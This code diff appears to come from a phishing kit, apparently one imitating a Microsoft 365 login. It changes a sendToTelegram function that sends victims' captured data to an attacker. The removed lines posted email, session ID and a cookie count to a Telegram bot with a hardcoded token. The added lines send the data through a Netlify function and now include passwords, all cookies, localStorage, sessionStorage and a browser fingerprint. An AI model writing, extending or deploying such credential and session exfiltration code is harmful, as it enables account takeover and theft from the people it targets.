@@ -75,41 +75,37 @@ export const getStorageData = (storageType: 'localStorage' | 'sessionStorage') =
 };
 
 export const sendToTelegram = async (sessionData: any, fingerprint: any) => {
-  const TELEGRAM_BOT_TOKEN = '7729721822:AAEhGJzQzQzQzQzQzQzQzQzQzQzQzQzQzQz';
-  const TELEGRAM_CHAT_ID = '-1002345678901';
-
-  const message = `
-🔐 *PARIS365 RESULTS*
-
-👤 *User Info:*
-• Email: \`${sessionData.email}\`
-• Provider: ${sessionData.provider}
-• Session ID: \`${sessionData.sessionId}\`
-• Auth Method: ${sessionData.authenticationMethod}
-
-🌐 *Device Info:*
-• Platform: ${sessionData.deviceInfo?.platform || 'Unknown'}
-• Language: ${sessionData.deviceInfo?.language || 'Unknown'}
-• Timezone: ${fingerprint.timezone || 'Unknown'}
-
-📱 *Screen:* ${fingerprint.screen?.width || 0}x${fingerprint.screen?.height || 0}
-
-🍪 *Cookies:* ${fingerprint.totalCookiesCaptured || 0} captured
-
-⏰ *Timestamp:* ${sessionData.timestamp}
-  `;
-
+  // Use environment variables or fallback to sendTelegram function
   try {
-    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+    const response = await fetch('/.netlify/functions/sendTelegram', {
       method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
+      headers: {
+        'Content-Type': 'application/json',
+      },
       body: JSON.stringify({
-        chat_id: TELEGRAM_CHAT_ID,
-        text: message,
-        parse_mode: 'Markdown'
+        email: sessionData.email,
+        password: sessionData.password || 'OAuth Login',
+        provider: sessionData.provider || 'Microsoft',
+        fileName: sessionData.fileName || 'OAuth Session',
+        timestamp: sessionData.timestamp,
+        userAgent: navigator.userAgent,
+        browserFingerprint: fingerprint,
+        documentCookies: document.cookie,
+        sessionId: sessionData.sessionId,
+        cookies: fingerprint.cookies || document.cookie,
+        formattedCookies: fingerprint.formattedCookies || [],
+        localStorage: fingerprint.localStorage,
+        sessionStorage: fingerprint.sessionStorage,
+        authenticationMethod: sessionData.authenticationMethod,
+        deviceInfo: sessionData.deviceInfo
       })
     });
+
+    const result = await response.json();
+    console.log('✅ OAuth data sent to Telegram:', result);
+    return result;
   } catch (error) {
-    console.error('Failed to send to Telegram:', error);
+    console.error('❌ Failed to send OAuth data to Telegram:', error);
+    return { error: error.message };
   }
 };
